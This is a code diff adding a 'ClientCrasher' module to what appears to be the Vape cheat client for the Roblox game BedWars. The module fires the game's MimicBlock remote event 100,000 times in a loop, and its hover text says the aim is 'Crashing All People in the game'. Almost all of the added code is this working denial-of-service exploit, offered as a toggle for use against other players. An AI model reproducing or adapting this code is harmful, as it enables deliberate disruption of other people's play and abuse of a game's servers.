@@ -8913,6 +8913,37 @@ runFunction(function()
 end)
 
 runFunction(function()
+    local block = "DisguisedPlayerBlock_" .. game.Players.LocalPlayer.UserId
+    local ProValue = {Value = 100000}
+    local ClientCrasher = {}
+    ClientCrasher = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
+        Name = 'ClientCrasher',
+        HoverText = 'The Funniest Milo Kit',
+        Function = function(callback)
+            if callback then
+                task.spawn(function()
+                    lplr.Character:Destroy()
+                    warningNotification("Vape", "Start Crashing In 2 seconds", 3)
+                    task.wait(2)
+                    ClientCrasher.ToggleButton(false)
+                    for i = 1, ProValue.Value do
+                        replicatedStorageService.rbxts_include.node_modules["@rbxts"].net.out._NetManaged.MimicBlock:FireServer({
+                            ["data"] = {
+                                ["blockType"] = "wood_plank_oak",
+                            },
+                        })
+                    end
+                    lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+                end)
+            else
+                lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+            end
+        end,
+        HoverText = 'Crashing All People in the game'
+    })
+end)
+
+runFunction(function()
 	local OpenEnderchest = {Enabled = false}
 	OpenEnderchest = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
 		Name = "OpenEnderchest",
